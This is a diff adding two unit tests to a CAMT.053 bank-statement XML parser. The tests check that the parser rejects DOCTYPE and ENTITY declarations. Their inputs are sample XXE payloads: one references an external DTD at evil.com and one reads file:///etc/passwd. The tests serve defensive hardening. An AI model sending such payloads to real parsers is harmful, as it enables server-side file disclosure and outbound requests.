@@ -342,4 +342,14 @@ describe("parseCamt053Xml", () => {
       /Split multi-statement CAMT exports into separate XML files and import them one statement at a time/,
     );
   });
+
+  it("rejects XML containing DOCTYPE declarations", () => {
+    const malicious = `<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://evil.com/xxe"><Document></Document>`;
+    expect(() => parseCamt053Xml(malicious)).toThrow(/must not contain DOCTYPE or ENTITY/);
+  });
+
+  it("rejects XML containing ENTITY declarations", () => {
+    const malicious = `<?xml version="1.0"?><!ENTITY xxe SYSTEM "file:///etc/passwd"><Document></Document>`;
+    expect(() => parseCamt053Xml(malicious)).toThrow(/must not contain DOCTYPE or ENTITY/);
+  });
 });
